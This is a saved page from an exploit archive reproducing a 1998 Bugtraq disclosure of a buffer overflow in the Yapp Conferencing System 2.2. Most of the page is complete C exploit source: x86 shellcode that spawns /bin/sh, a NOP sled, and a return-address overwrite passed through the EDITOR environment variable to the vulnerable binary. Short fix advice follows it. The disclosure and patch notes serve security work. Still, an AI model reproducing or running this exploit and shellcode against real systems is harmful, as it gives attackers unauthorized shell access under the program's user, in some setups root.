<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0050)http://www.insecure.org/sploits/yapp.overflow.html -->
<HTML><HEAD><TITLE>Buffer overflow in the Yapp Conferencing System Version 2.2</TITLE>
<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
<META content="standard overflow" name=description>
<META 
content=" Buffer, Conferencing, Linux, System, This, Version, Yapp, exploit, other, overflow, platform, running, should, standard, vulnerable, x86" 
name=keywords>
<META content="MSHTML 6.00.2600.0" name=GENERATOR></HEAD>
<BODY text=#ffffff vLink=#7f7f7f link=#0b7cff bgColor=#000000>
<TABLE cellSpacing=0 cellPadding=0 width="100%">
  <TBODY>
  <TR>
    <TD align=left><A href="http://www.insecure.org/"><IMG height=90 
      src="Buffer overflow in the Yapp Conferencing System Version 2_2_files/Insecurelogo-eye-90x168.gif" 
      width=168 border=0></A> </TD>
    <TD vAlign=bottom align=right><!-- Begin Banner Code --><IFRAME 
      marginWidth=0 marginHeight=0 
      src="Buffer overflow in the Yapp Conferencing System Version 2_2_files/pro.pl" 
      frameBorder=0 width=728 scrolling=no 
      height=90>
<SCRIPT LANGUAGE="JavaScript"><!--
random = parseInt(Math.random()*10000)
banner = '<A HREF="http://cgi.insecure.org/cgi-bin/pro/pro.pl?banner=NonSSI;'
banner += 'page=' + random + '" >';
banner += '<IMG SRC="http://cgi.insecure.org/cgi-bin/pro/pro.pl?'
banner += 'page=' + random + '" '
banner += ' ALT="Click Here!" BORDER=0></A>'
document.write(banner)
// --></SCRIPT>
<NOSCRIPT>
<A HREF="http://cgi.insecure.org/cgi-bin/pro/pro.pl?banner=NonSSI;page=01">
<IMG SRC="http://cgi.insecure.org/cgi-bin/pro/pro.pl?page=01"
     ALT="Click Here!" BORDER=0></A>
</NOSCRIPT>
</IFRAME><!-- End Banner Code --></TD></TR></TBODY></TABLE>
<CENTER>
<H1><B>Buffer overflow in the Yapp Conferencing System Version 
2.2</B></H1></CENTER>
<TABLE width="100%">
  <TBODY>
  <TR bgColor=#005f00>
    <TH align=middle><B>Summary</B></TH></TR></TBODY></TABLE>
<TABLE>
  <TBODY>
  <TR>
    <TD vAlign=top><B>Description:</B></TD>
    <TD>standard overflow</TD></TR>
  <TR>
    <TD vAlign=top><B>Author:</B></TD>
    <TD>satan &lt;satan@FREENET.NETHER.NET&gt;</TD></TR>
  <TR>
    <TD vAlign=top><B>Compromise:</B></TD>
    <TD>Run arbitrary commands as the uid yapp is running under (often 
    'yapp').</TD></TR>
  <TR>
    <TD vAlign=top><B>Vulnerable Systems:</B></TD>
    <TD>This exploit is for x86/Linux . Any other platform running Yapp should 
      be vulnerable. </TD></TR>
  <TR>
    <TD vAlign=top><B>Date:</B></TD>
    <TD>20 January 1998 </TD></TR><!-- <TR><TD VALIGN="top"><B>Notes:</B></TD><TD> </TD></TR> --></TBODY></TABLE>
<TABLE width="100%">
  <TBODY>
  <TR bgColor=#005f00>
    <TH align=middle><B>Details</B></TH></TR></TBODY></TABLE><BR><PRE>
Date: Tue, 20 Jan 1998 03:14:01 -0500
From: satan &lt;satan@FREENET.NETHER.NET&gt;
To: BUGTRAQ@NETSPACE.ORG
Subject: Buffer overflow in Yapp Conferencing System...

This is my first Bugtraq post, hope I'm doing this right...

The Yapp Conferencing System Version 2.2 (and others?) has an exploitable
buffer overrun in it's macro processing code. On line 215 of macro.c, we
see:

sprintf(buff,"%s=%s",name,value);

The variable "value" is taken from the environment and is never checked to
ensure that it's length does not exceed the ammount of space remaining in
the buffer after "NAME=" has been inserted. It is trivial to overflow
"buff" by defining "NAME" in the environment to contain a string longer
then the size of "buff" (512 characters) minus the length of "NAME=". I
have included an exploit which I wrote for Intel 80x86/Linux, it uses the
variable "EDITOR" (which I selected compeletely at random). This bug is
most like not going to have serious security implications, since Yapp
hardly ever runs setuid root (in fact, the README suggests creating a
special user to run Yapp as), but I could see a situation where an
attacker gains access to the special Yapp uid, replaces the Yapp binary
with a trojan version, and then waits for root to run it. If you're
looking for a way to patch this hole, read the exploit source.
-------------------------------------------------------------------------------



  [Part 2, ""  Text/PLAIN  73 lines]
  [Unable to print this part]

/*
 * Exploit for "Yapp Conferencing System, Version 2.2".
 * By Dave Bowman, for Sandra, on January 13 1998.
 *
 * Description:
 *
 * The Yapp Conferencing System client handles environment variables
 * without doing bounds checking, allowing one to overflow a buffer 
 * in the "bbs" executable onto the stack. Using this technique, it
 * possible to obtain a shell running as the user which Yapp is setuid
 * to (in some cases, root).
 *
 * Usage:
 *
 * bash$ gcc -o yapp_exploit yapp_exploit.c
 * bash$ ./yapp_exploit
 * bash#
 *
 * You'll have to change the definition of "BBS_PROGRAM" in the source. You
 * may also need to alter the offset, but -1000 worked for me.
 *
 * Temporary fix:
 *
 * bash# chmod u-s /usr/local/bin/bbs
 *
 * Long term fix:
 *
 * Either change the sprintf (3) call on line 215 of macro.c to something
 * which checks the bounds of the data it copies, or simply force strings
 * read in from the environment to a specific length, i.e.
 *
 * env_string [511] = '\0';
 *
 * if your buffer was 512 characters wide. Please keep in mind however,
 * in terms of security, Yapp is a _very_ poorly writen program and
 * should probably not run setuid anyone, let alone root. If you can
 * possibly avoid it, don't run Yapp setuid.
 *
 * And without further ado...
 *
 */

#if ! defined (__i386__) || ! defined (__linux__)
#error Intel 80x86/Linux platform required.
#endif

#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

#define BUFFSIZE	512 - strlen ("EDITOR=")	/* Size of buffer. */
#define OFFSET		-1000				/* Offset. */
#define BBS_PROGRAM	"/home/dave/yapp/bbs"		/* Path to program. */

/* Function which returns the base address of the stack. */
long get_esp (void)
{
	__asm__ ("movl %esp, %eax\n");
}

/* Machine code instructions to execute /bin/sh, I had them here in */
/* global for a reason and now I just don't feel like playing with */
/* the stack offset anymore. */
unsigned char exec_shell [] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

/* Main function, duh. */
int main (void)
{
	unsigned char buff [518];		/* Buffer to hold our data. */
	unsigned char *ptr;			/* Pointer. */
	int count;				/* Counter. */
	unsigned long *address_ptr;		/* Long pointer. */

	/* First we fill the buffer with NOP instructions. */
	(void) memset (buff, 0x90, sizeof (buff));

	/* Then we copy our shell code into the buffer. */
	ptr = buff;
	ptr += BUFFSIZE - strlen (exec_shell);
	for (count = 0; count &lt; strlen (exec_shell); count++)
		*ptr++ = exec_shell [count];
	
	/* Now we insert our return address into ebp and eip. */
	address_ptr = (unsigned long *) &amp;buff [509];
	for (count = 0; count &lt; 2; count++)
		*address_ptr++ = get_esp () + OFFSET;
	
	/* Here we terminate the buffer as a string... */
	ptr = (unsigned char *) address_ptr;
	*ptr = '\0';

	/* And attempt to load it into our environment. */
	unsetenv ("EDITOR");
	if (setenv ("EDITOR", buff, 1)) {
		perror ("setenv");
		exit (1);
	}

	/* Finally, we execute Yapp. */
	(void) execl (BBS_PROGRAM, BBS_PROGRAM, NULL);
	perror (BBS_PROGRAM);
	exit (1);
}
</PRE><PRE>
</PRE>
<TABLE width="100%">
  <TBODY>
  <TR bgColor=#005f00>
    <TH align=middle><B>More Exploits!</B></TH></TR></TBODY></TABLE><BR>The master 
index of all exploits is available <A 
href="http://www.insecure.org/sploits_all.html">here</A> (Very large file)<BR>Or 
you can pick your favorite operating system:<BR>
<TABLE border=1>
  <TBODY>
  <TR>
    <TD><A href="http://www.insecure.org/sploits_all.html">All OS's</A></TD>
    <TD><A href="http://www.insecure.org/sploits_linux.html">Linux</A></TD>
    <TD><A 
      href="http://www.insecure.org/sploits_solaris.html">Solaris/SunOS</A></TD>
    <TD><A 
    href="http://www.insecure.org/sploits_microshit.html">Micro$oft</A></TD></TR>
  <TR>
    <TD><A href="http://www.insecure.org/sploits_bsd.html">*BSD</A></TD>
    <TD><A href="http://www.insecure.org/sploits_mac.html">Macintosh</A></TD>
    <TD><A href="http://www.insecure.org/sploits_aix.html">AIX</A></TD>
    <TD><A href="http://www.insecure.org/sploits_irix.html">IRIX</A></TD></TR>
  <TR>
    <TD><A href="http://www.insecure.org/sploits_ultrix.html">ULTRIX/Digital 
      UNIX</A></TD>
    <TD><A href="http://www.insecure.org/sploits_hpux.html">HP/UX</A></TD>
    <TD><A href="http://www.insecure.org/sploits_sco.html">SCO</A></TD>
    <TD><A href="http://www.insecure.org/sploits_remote.html">Remote 
      exploits</A></TD></TR></TBODY></TABLE><BR>This page is part of <A 
href="http://www.insecure.org/sploits.html">Fyodor's exploit world</A>. For a 
free program to automate scanning your network for vulnerable hosts and 
services, check out my network mapping tool, <A 
href="http://www.insecure.org/nmap/index.html">nmap</A>. Or try these <A 
href="http://www.insecure.org/">Insecure.Org</A> resouces:<BR><BR>
<CENTER>[ <A href="http://www.insecure.org/nmap/index.html"><FONT 
color=#ffffff>Nmap</FONT></A> | <A 
href="http://www.insecure.org/tools.html"><FONT color=#ffffff>Tools</FONT></A> | 
<A href="http://lists.insecure.org/"><FONT color=#ffffff>Lists</FONT></A> | <A 
href="http://www.insecure.org/reading.html"><FONT 
color=#ffffff>Reading</FONT></A> | <A href="http://www.insecure.org/"><FONT 
color=#ffffff>News</FONT></A> | <A 
href="http://www.insecure.org/myworld.html"><FONT 
color=#ffffff>About/Contact</FONT></A> | <A 
href="http://www.insecure.org/advertising.html"><FONT 
color=#ffffff>Advertising</FONT></A> | <A 
href="http://www.insecure.org/privacy.html"><FONT color=#ffffff>Privacy 
Policy</FONT></A> ]<BR></CENTER></BODY></HTML>
